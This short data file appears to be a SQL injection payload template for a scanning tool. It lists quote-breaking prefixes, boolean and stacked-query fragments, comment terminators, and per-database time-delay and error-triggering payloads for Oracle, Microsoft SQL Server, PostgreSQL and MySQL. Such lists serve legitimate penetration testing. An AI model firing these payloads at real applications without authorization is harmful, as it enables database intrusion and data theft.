# Global
## Prefix 0
' 
') 
'))  
) 
)) 
" 
\' 
\" 
'' 
"" 
## Prefix 1
AND 
OR 
; SELECT 
## Full Suffix
--
/*
%00
## Payload
1 == 1
'1' == '1
# Oracle
## Payload
dbms_pipe.receive_message(('a'),10)
TO_CHAR(1/0)
# Microsoft
## Payload
WAITFOR DELAY '0:0:10'
1/0
# PostgreSQL
## Payload
pg_sleep(10)
1/(SELECT 0)
# MySQL 
## Full Suffix
-- -
## Payload
SLEEP(10)